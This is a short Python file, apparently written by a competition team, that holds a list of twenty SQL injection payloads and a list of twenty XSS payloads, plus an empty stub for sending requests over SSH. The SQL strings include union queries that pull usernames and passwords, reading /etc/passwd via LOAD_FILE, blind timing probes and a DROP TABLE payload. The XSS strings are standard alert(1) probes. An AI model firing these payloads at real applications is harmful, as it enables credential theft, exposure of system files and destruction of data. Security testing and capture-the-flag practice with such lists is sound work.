

# Название команды: ЧВК Сырочек


import ssh_interface

requests_SQL = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' UNION SELECT null, null--",
    "' UNION SELECT 1, @@version--",
    "' UNION SELECT 1, table_name FROM information_schema.tables--",
    "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT username, password FROM users--",
    "' AND SLEEP(5)--",
    "'; DROP TABLE users--",
    "' OR 1=1 LIMIT 1--",
    "' ORDER BY 1--",
    "' ORDER BY 3--",
    "' AND (SELECT COUNT(*) FROM users) > 0--",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--",
    "' UNION SELECT 1, LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT 1, user()--",
    "' UNION SELECT 1, database()--",
    "' AND 1=IF(1=1, SLEEP(3), 0)--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()—"
    ]

requests_XSS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '"><script>alert(1)</script>',
    "' onmouseover=alert(1) '",
    '<x onclick="alert(1)">click</x>',
    '''<div style="background:url('javascript:alert(1)')">''',
    '<object data="javascript:alert(1)">',
    '<embed src="data:text/html,<script>alert(1)</script>">',
    '<form action="javascript:alert(1)"><input type=submit>',
    '<isindex action="javascript:alert(1)" type=image>',
    '''<xss style="background:url('javascript:alert(1)')">''',
    '<math><brute href="javascript:alert(1)">click</brute></math>',
    '<video><source onerror="javascript:alert(1)">',
    ]

def sshRequest(request):
    pass










